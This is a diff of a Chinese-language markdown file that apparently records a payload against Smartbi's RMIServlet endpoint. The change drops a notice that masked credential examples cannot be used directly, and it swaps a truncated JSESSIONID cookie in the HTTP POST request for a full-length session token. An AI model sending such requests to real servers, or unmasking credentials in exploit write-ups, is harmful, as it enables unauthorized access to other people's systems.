@@ -40,7 +40,7 @@ schema_version: "1"
 
 ## 操作风险
 
-命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -70,7 +70,7 @@ payload：
 ```http
 POST /smartbi/vision/RMIServlet HTTP/1.1
 Host: IP：PORT
-Cookie: JSESSIONID=B49B33FAF5B8F0
+Cookie: JSESSIONID=B49B33FAF5B8F0EBA546D2D149200A30
 Content-Length: 67
 Cache-Control: max-age=0
 Sec-Ch-Ua: 
